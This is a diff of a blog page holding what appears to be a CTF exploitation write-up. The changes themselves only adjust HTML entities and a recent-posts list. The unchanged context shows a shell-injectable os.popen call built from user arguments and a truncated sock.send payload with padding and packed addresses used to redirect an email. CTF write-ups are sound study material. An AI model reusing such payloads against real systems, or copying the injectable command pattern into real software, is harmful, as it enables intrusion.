@@ -115,7 +115,7 @@ else
 }
 </code></pre>
 
-<p>Function report() ask us to input Title(60 bytes), Contents and then execute &#8220;/home/solve1/script.py&#8221;.</p>
+<p>Function report() ask us to input Title(60 bytes), Contents and then execute “/home/solve1/script.py”.</p>
 
 <pre><code>size_t content_len; // eax@10
 char contents[256]; // [sp+2Ch] [bp-66Ch]@1
@@ -142,7 +142,7 @@ data = os.popen("/home/solve1/vuln "+"'"+sys.argv[3]+"'").read()
 
 <p>From the vulnarability of debugd, wo can construct the the parameter to vuln, and change the email destination to ours.</p>
 
-<p>We can type 2 to dump the assembly code of vuln, the main() function is very simple, after copy argv&#91;1] to local buffer [sep+0x20&#93;(this buffer is 0x100 byte long, and strncpy&rsquo;s third parameter specify the maxlen to 0x100), then it copy argv[1] to global buffer 0x804a060, and call printf function to print the buffer [esp+0x20], the all code is below:</p>
+<p>We can type 2 to dump the assembly code of vuln, the main() function is very simple, after copy argv[1] to local buffer [sep+0x20](this buffer is 0x100 byte long, and strncpy’s third parameter specify the maxlen to 0x100), then it copy argv[1] to global buffer 0x804a060, and call printf function to print the buffer [esp+0x20], the all code is below:</p>
 
 <pre><code>push   %ebp
 mov    %esp,%ebp
@@ -246,6 +246,10 @@ sock.send("a"+"\x00"*255+myemail+"\x00"*(40-myemail)+"\x12\xa0\x04\x08"+"\x10\xa
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/csaw-ctf-2013-crypto500-writeup/">CSAW CTF 2013 Crypto500 Writeup</a>
+      </li>
+    
+      <li class="post">
         <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
       </li>
     
@@ -259,10 +263,6 @@ sock.send("a"+"\x00"*255+myemail+"\x00"*(40-myemail)+"\x12\xa0\x04\x08"+"\x10\xa
     
       <li class="post">
         <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
-      </li>
-    
-      <li class="post">
-        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
       </li>
     
   </ul>
